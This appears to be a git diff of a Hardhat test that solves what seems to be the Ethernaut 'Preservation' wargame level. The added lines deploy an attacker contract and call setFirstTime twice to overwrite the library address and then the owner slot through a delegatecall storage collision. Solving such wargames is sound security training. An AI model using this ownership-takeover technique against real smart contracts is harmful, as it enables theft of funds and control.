@@ -2,6 +2,7 @@ import { expect } from "chai";
 import { BigNumber, Contract, Signer } from "ethers";
 import { ethers } from "hardhat";
 import { createChallenge, submitLevel } from "./utils";
+const BN = BigNumber;
 
 let accounts: Signer[];
 let eoa: Signer;
@@ -20,6 +21,16 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  const attackerFactory = await ethers.getContractFactory('PreservationAttacker')
+  let attacker = await attackerFactory.connect(eoa).deploy()
+
+  await challenge.connect(eoa).setFirstTime(BN.from("0x652152e23E82aFdaCa2Ac1a5535269281b5BeF3b")) // attacker address
+  console.log("library1:",await ethers.provider.getStorageAt(challenge.address,0))
+  
+  await challenge.connect(eoa).setFirstTime(BN.from("0x6B06820261843672e0ca3DC2797b17d779a8493D")) // eoa address
+  console.log("owner:",await ethers.provider.getStorageAt(challenge.address,2))
+
 });
 
 after(async () => {
